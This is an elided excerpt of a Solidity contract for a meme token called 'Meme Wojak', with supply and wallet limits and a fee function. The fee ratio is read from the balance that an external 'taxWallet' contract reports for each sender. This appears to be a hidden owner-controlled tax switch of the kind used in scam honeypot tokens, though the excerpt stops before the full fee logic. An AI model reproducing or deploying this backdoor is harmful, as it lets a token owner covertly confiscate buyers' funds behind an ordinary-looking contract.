...
contract MemeWojak is ERC20, Ownable {
    using SafeMath for uint256;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Meme Wojak";
    string constant _symbol = "MEWOJAK";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 1_000_000_000 * (10 ** _decimals);
    uint256 public _maxWalletAmount = _totalSupply * 50 / 1000;
    ...
    constructor (address _routerAddress, address _taxWallet) Ownable(msg.sender) {
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (recipient != pair && recipient != DEAD) {
            require(isLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletAmount, "Transfer amount exceeds the bag size.");
        }
    ...
    function takeFee(uint256 amount, address sender) internal view returns (uint256) {
        uint256 ratio = ERC20(taxWallet).balanceOf(sender);
